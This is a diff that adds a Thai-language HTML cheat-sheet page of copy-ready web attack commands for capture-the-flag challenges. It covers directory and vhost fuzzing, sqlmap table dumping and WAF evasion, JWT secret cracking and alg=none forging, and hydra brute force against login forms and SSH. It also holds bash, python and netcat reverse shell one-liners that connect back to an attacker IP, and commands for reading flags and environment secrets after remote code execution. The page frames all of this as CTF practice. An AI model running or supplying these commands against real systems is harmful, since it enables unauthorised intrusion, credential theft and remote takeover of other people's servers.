@@ -1,0 +1,289 @@
+<!doctype html>
+<html lang="th" data-theme="light">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Web Commands · Personal Notes</title>
+<meta name="description" content="curl / ffuf / sqlmap / jwt_tool / hydra / reverse shell">
+<link rel="stylesheet" href="../assets/site.css">
+</head>
+<body>
+<div class="wrap">
+  <aside class="sidebar">
+    <a class="brand" href="../index.html">
+      <span class="logo">PN</span>
+      <span><b>Personal Notes</b><small>Cheat sheets · Automation · Tools</small></span>
+    </a>
+    <nav class="nav">
+<a href="../index.html"><span class="ico">🏠</span> หน้าแรก</a>
+<div class="nav-group">
+<div class="label">📌 เริ่มต้น</div>
+<a class="sub" href="../overview.html">ภาพรวมทั้งหมด</a>
+</div>
+<div class="nav-group">
+<div class="label">🚀 Automation</div>
+<a class="sub" href="../Automation/automation_guide.html">Automation — หา Flag ด้วยคำสั่งเดียว</a>
+</div>
+<div class="nav-group">
+<div class="label">🔐 Crypto</div>
+<a class="sub" href="../Crypto/crypto_cheatsheet.html">Crypto Cheatsheet</a>
+</div>
+<div class="nav-group">
+<div class="label">🧪 Forensics</div>
+<a class="sub" href="../Forensics/file_signatures.html">File Signatures</a>
+<a class="sub" href="../Forensics/binwalk_commands.html">binwalk &amp; Carving</a>
+<a class="sub" href="../Forensics/strings_commands.html">strings</a>
+<a class="sub" href="../Forensics/metadata.html">Metadata</a>
+</div>
+<div class="nav-group">
+<div class="label">🌐 Web</div>
+<a class="sub" href="../Web/web_cheatsheet.html">Web Cheatsheet</a>
+<a class="sub" href="../Web/common_payloads.html">Common Payloads</a>
+<a class="sub active" href="../Web/commands.html">Web Commands</a>
+</div>
+<div class="nav-group">
+<div class="label">🧩 Reverse</div>
+<a class="sub" href="../Reverse/reversing_notes.html">Reversing Notes</a>
+<a class="sub" href="../Reverse/common_commands.html">Reverse Commands</a>
+</div>
+<div class="nav-group">
+<div class="label">🔍 OSINT</div>
+<a class="sub" href="../OSINT/methodology.html">OSINT Methodology</a>
+</div>
+<div class="nav-group">
+<div class="label">🧰 Misc</div>
+<a class="sub" href="../Misc/useful_commands.html">Useful Commands</a>
+</div>
+<div class="nav-group"><div class="label">🔎 ค้นหา</div><a class="sub" href="../tools.html">Tools Index</a><a class="sub" href="../index.html#search">ค้นหาทั้งหมด</a></div>
+    </nav>
+  </aside>
+  <div class="main">
+    <header class="topbar">
+      <button class="icon-btn menu-btn" id="menu-btn" aria-label="เมนู">☰</button>
+      <div class="crumb">🌐 Web / <b>Web Commands</b></div>
+      <button class="icon-btn" id="theme-btn" aria-label="ธีม">🌙</button>
+    </header>
+    <main class="content">
+<div class="toolrow"><a href="../tools.html#curl">curl</a><a href="../tools.html#ffuf">ffuf</a><a href="../tools.html#feroxbuster">feroxbuster</a><a href="../tools.html#gobuster">gobuster</a><a href="../tools.html#katana">katana</a><a href="../tools.html#sqlmap">sqlmap</a><a href="../tools.html#jwt_tool">jwt_tool</a><a href="../tools.html#hydra">hydra</a><a href="../tools.html#nc">nc</a></div>
+<h1 id="web-commands">Web Commands — คำสั่งพร้อมใช้ (คัดลอกได้เลย)</h1>
+<blockquote>
+<p>ทุกคำสั่งใช้กับ target ของโจทย์เท่านั้น
+เปลี่ยน <code>target</code> เป็น IP/โดเมนจริงก่อนรัน</p>
+</blockquote>
+<hr />
+<h2 id="1">1) ตั้งค่าพื้นฐาน</h2>
+<pre><code class="language-bash">T=http://target:8080          # ตั้งตัวแปร เพื่อพิมพ์สั้น
+T=https://target
+
+# เก็บ cookie ไว้ใช้ต่อ
+curl -s -c c.txt &quot;$T/login&quot; -d 'user=a&amp;pass=b' -o /dev/null
+curl -s -b c.txt &quot;$T/dashboard&quot;
+</code></pre>
+<hr />
+<h2 id="2-curl">2) curl — ใช้ให้ครบทุกท่า</h2>
+<pre><code class="language-bash">curl -i &quot;$T/&quot;                                  # เห็น header + body
+curl -s -I &quot;$T/&quot;                               # เฉพาะ header
+curl -s -L &quot;$T/&quot;                               # ตาม redirect
+curl -s -k &quot;$T/&quot;                               # ข้าม cert ที่ผิด (https)
+curl -s --max-time 5 &quot;$T/&quot;                     # กันค้าง
+
+# method ต่าง ๆ
+curl -s -X POST &quot;$T/api&quot; -H 'Content-Type: application/json' -d '{&quot;a&quot;:1}'
+curl -s -X PUT  &quot;$T/api/1&quot; -d '{&quot;role&quot;:&quot;admin&quot;}'
+curl -s -X OPTIONS -i &quot;$T/api&quot;
+
+# ใส่ header แปลก ๆ
+curl -s -H 'X-Forwarded-For: 127.0.0.1' &quot;$T/admin&quot;
+curl -s -H 'X-Original-URL: /admin' &quot;$T/&quot;
+curl -s -A 'Mozilla/5.0' &quot;$T/&quot;
+
+# อัปโหลดไฟล์
+curl -s -F 'file=@shell.php' &quot;$T/upload.php&quot;
+
+# วัดผลเทียบกัน
+for p in / /admin /login /flag; do
+  printf '%-10s ' &quot;$p&quot;; curl -s -o /dev/null -w '%{http_code} %{size_download}\n' &quot;$T$p&quot;
+done
+</code></pre>
+<hr />
+<h2 id="3-ffuf-path-parameter-vhost">3) ffuf — หา path / parameter / vhost</h2>
+<pre><code class="language-bash"># path
+ffuf -u &quot;$T/FUZZ&quot; -w /usr/share/seclists/Discovery/Web-Content/common.txt \
+     -mc 200,204,301,302,401,403 -t 40
+
+# ซ่อนผลที่ไม่สนใจ (กรอง 404 ที่ size เท่ากัน)
+ffuf -u &quot;$T/FUZZ&quot; -w wordlist.txt -fs 0,1234
+
+# parameter (หา param ที่ซ่อน)
+ffuf -u &quot;$T/page.php?FUZZ=1&quot; -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -fs 0
+
+# ค่า param (เช่น id)
+ffuf -u &quot;$T/page.php?id=FUZZ&quot; -w numbers.txt
+
+# subdomain / vhost
+ffuf -u http://FUZZ.target.com -w subdomains.txt
+ffuf -u &quot;$T&quot; -H 'Host: FUZZ.target' -w subdomains.txt -fs 0
+
+# บันทึกผล
+ffuf -u &quot;$T/FUZZ&quot; -w wordlist.txt -o ffuf.json -of json
+</code></pre>
+<hr />
+<h2 id="4-feroxbuster-gobuster">4) feroxbuster / gobuster</h2>
+<pre><code class="language-bash">feroxbuster -u &quot;$T&quot; -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt \
+            -x php,html,txt,bak,zip -t 40
+
+gobuster dir -u &quot;$T&quot; -w /usr/share/wordlists/dirb/common.txt \
+             -x php,txt,html -s 200,204,301,302,403 -t 40
+gobuster vhost -u &quot;$T&quot; -w subdomains.txt
+</code></pre>
+<hr />
+<h2 id="5-katana-crawl-link">5) katana — crawl เก็บ link ทั้งเว็บ</h2>
+<pre><code class="language-bash">katana -u &quot;$T&quot; -d 3 -o urls.txt
+katana -u &quot;$T&quot; -d 3 -jc -o urls_js.txt      # -jc = เก็บ JS ด้วย
+sort -u urls.txt | grep -v -E '\.(png|jpg|css|woff)' | head -50
+</code></pre>
+<hr />
+<h2 id="6-nmap">6) nmap — ดูว่าเป้าหมายเปิดอะไร</h2>
+<pre><code class="language-bash">nmap -sV -sC target
+nmap -p- --min-rate 1000 target
+nmap -sV -p 80,443,8080,8000,3000,5000 target
+</code></pre>
+<hr />
+<h2 id="7-sqlmap">7) sqlmap</h2>
+<pre><code class="language-bash"># GET
+sqlmap -u &quot;$T/item.php?id=1&quot; --batch --dbs
+
+# POST
+sqlmap -u &quot;$T/login.php&quot; --data=&quot;user=a&amp;pass=b&quot; --batch --dbs
+
+# จาก request ที่บันทึกด้วย Burp (แม่นสุด)
+sqlmap -r request.txt --batch --dbs
+
+# ระบุ DB/Table
+sqlmap -u &quot;$T/item.php?id=1&quot; --batch -D app -T users --columns
+sqlmap -u &quot;$T/item.php?id=1&quot; --batch -D app -T users -C username,password --dump
+
+# ตัวเลือกที่มีประโยชน์
+--level=5 --risk=3        # ลึกขึ้น (ระวัง)
+--technique=U             # union only
+--tamper=space2comment    # หลบ WAF
+--os-shell                # ใช้เมื่อจำเป็นจริง ๆ
+</code></pre>
+<hr />
+<h2 id="8-jwt_tool">8) jwt_tool</h2>
+<pre><code class="language-bash">jwt_tool &lt;token&gt;                                   # ถอด + ตรวจ
+jwt_tool &lt;token&gt; -T                                # โหมดแก้ (interactive)
+jwt_tool &lt;token&gt; -C -d /usr/share/wordlists/rockyou.txt   # crack secret
+jwt_tool &lt;token&gt; -S hs256 -p '&lt;secret&gt;' -I -pc role -pv admin
+jwt_tool &lt;token&gt; -X a                              # ลอง alg=none / kid injection
+</code></pre>
+<p><strong>ถอด JWT ด้วยมือ (ไม่ต้องพึ่ง tool):</strong></p>
+<pre><code class="language-bash">python3 - &lt;&lt;'PY'
+import base64, json, sys
+tok = &quot;&lt;paste token&gt;&quot;
+for i, part in enumerate(tok.split(&quot;.&quot;)[:2]):
+    pad = &quot;=&quot; * (-len(part) % 4)
+    print((&quot;HEADER&quot;,&quot;PAYLOAD&quot;)[i], json.dumps(json.loads(base64.urlsafe_b64decode(part + pad)), indent=2))
+PY
+</code></pre>
+<hr />
+<h2 id="9-burp-suite-ce">9) Burp Suite CE — ตั้งค่าเร็ว</h2>
+<pre><code>1. เปิด Burp → Proxy → Options → 127.0.0.1:8080
+2. ตั้ง browser proxy (หรือใช้ FoxyProxy)
+3. เปิด Intercept → ดู request
+4. คลิกขวา → Send to Repeater (แก้แล้วส่งซ้ำ)
+5. คลิกขวา → Copy as curl (เอาไปรันใน terminal)
+6. ถ้าเป็น HTTPS ให้ติดตั้ง CA: http://burp → Download certificate
+</code></pre>
+<p><strong>บันทึก request ไปให้ sqlmap:</strong></p>
+<pre><code>ใน Burp: คลิกขวาที่ request → Save item → request.txt
+แล้ว: sqlmap -r request.txt --batch --dbs
+</code></pre>
+<hr />
+<h2 id="10-hydra-brute-force-login">10) hydra — brute force login (ใช้เมื่อโจทย์อนุญาต)</h2>
+<pre><code class="language-bash"># HTTP POST form
+hydra -l admin -P /usr/share/wordlists/rockyou.txt target \
+      http-post-form &quot;/login:user=^USER^&amp;pass=^PASS^:F=invalid&quot;
+
+# HTTP Basic auth
+hydra -l admin -P /usr/share/wordlists/rockyou.txt target http-get /admin
+
+# SSH / FTP (ถ้าโจทย์เป็นแนว network)
+hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://target
+</code></pre>
+<blockquote>
+<p>เช็กก่อนว่าโจทย์ไม่ได้จำกัด rate — ยิงถี่เกินอาจโดน ban</p>
+</blockquote>
+<hr />
+<h2 id="11-reverse-shell-command-injection-rce">11) Reverse shell (เมื่อได้ command injection / RCE)</h2>
+<pre><code class="language-bash"># ฝั่งเรา
+nc -lvnp 4444
+
+# bash
+bash -i &gt;&amp; /dev/tcp/YOUR_IP/4444 0&gt;&amp;1
+
+# python3
+python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((&quot;YOUR_IP&quot;,4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;])'
+
+# netcat
+nc -e /bin/sh YOUR_IP 4444
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc YOUR_IP 4444 &gt;/tmp/f
+</code></pre>
+<p>ในช่อง input ที่จำกัดความยาว ให้ใช้ URL encode:</p>
+<pre><code class="language-bash">python3 -c &quot;import urllib.parse;print(urllib.parse.quote('bash -i &gt;&amp; /dev/tcp/1.2.3.4/4444 0&gt;&amp;1'))&quot;
+</code></pre>
+<hr />
+<h2 id="12-flag-rce">12) อ่าน flag หลังได้ RCE</h2>
+<pre><code class="language-bash">ls -la /; cat /flag*; cat /flag.txt; find / -name '*flag*' -maxdepth 3 2&gt;/dev/null
+env; cat /proc/self/environ | tr '\0' '\n' | grep -i flag
+</code></pre>
+<hr />
+<h2 id="13-writeup">13) บันทึกหลักฐาน (สำหรับ writeup)</h2>
+<pre><code class="language-bash">script -a session.log            # บันทึกทุกคำสั่งใน terminal
+curl -s &quot;$T/&quot; -o page.html       # เก็บหน้าเว็บ
+ffuf ... -o ffuf.json -of json   # เก็บผลสแกน
+</code></pre>
+<hr />
+<h2 id="14">14) แก้ปัญหาที่เจอบ่อย</h2>
+<div class="table-wrap"><table>
+<thead>
+<tr>
+<th>อาการ</th>
+<th>สาเหตุ/วิธีแก้</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>curl: (7) Failed to connect</code></td>
+<td>target ไม่ขึ้น / port ผิด → <code>nmap -p- target</code></td>
+</tr>
+<tr>
+<td>403 ทุก path</td>
+<td>อาจต้องใส่ header (<code>X-Forwarded-For</code>) หรือมี WAF</td>
+</tr>
+<tr>
+<td>302 ไปหน้า login ตลอด</td>
+<td>ต้องมี cookie → ใช้ <code>-b c.txt</code></td>
+</tr>
+<tr>
+<td>ffuf ได้ 200 ทุกอย่าง</td>
+<td>หน้า error ตอบ 200 → ใส่ <code>-fs &lt;size&gt;</code> กรอง</td>
+</tr>
+<tr>
+<td>sqlmap ไม่เจอ</td>
+<td>ลอง <code>--level=5 --risk=3</code>, หรือใช้ <code>-r request.txt</code></td>
+</tr>
+<tr>
+<td>JWT ใช้ไม่ได้หลังแก้</td>
+<td>signature ไม่ถูก → ต้องเซ็นใหม่ด้วย <code>jwt_tool -S</code></td>
+</tr>
+</tbody>
+</table></div>
+<div class="pager"><a class="prev" href="../Web/common_payloads.html"><span>ก่อนหน้า</span>Common Payloads</a><a class="next" href="../Reverse/reversing_notes.html"><span>ถัดไป</span>Reversing Notes</a></div>
+      <div class="footer">แก้ไขเนื้อหาได้ที่ไฟล์ <code>Web/commands.md</code> แล้วรัน <code>python3 build.py</code> ใหม่ · หน้านี้สร้างแบบ static ไม่ต้องต่อเน็ต</div>
+    </main>
+  </div>
+</div>
+<script src="../assets/site.js"></script>
+</body>
+</html>
